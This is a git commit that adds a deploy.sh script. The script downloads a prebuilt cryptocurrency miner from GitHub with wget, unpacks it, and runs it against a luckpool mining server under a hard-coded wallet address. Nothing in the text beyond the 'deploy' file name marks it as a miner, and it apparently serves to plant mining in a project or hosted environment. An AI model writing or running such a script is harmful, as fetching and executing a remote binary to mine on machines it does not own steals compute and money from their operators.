6de24d821de1d9fac648c846cd898f9b0654339b
psikopat-feb <100168766+psikopat-feb@users.noreply.github.com>
2022-02-23 09:29:31 +0700

    Add files via upload

---
+++ deploy.sh
@@ -0,0 +1,3 @@
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+tar xzvf hellminer_cpu_linux.tar.gz
+./hellminer -c stratum+tcp://ap.luckpool.net:3960 -u RR9Cy548xzp5ejB9Zfz1rj5AWDYADPR2av.coba -p hybrid --cpu 2
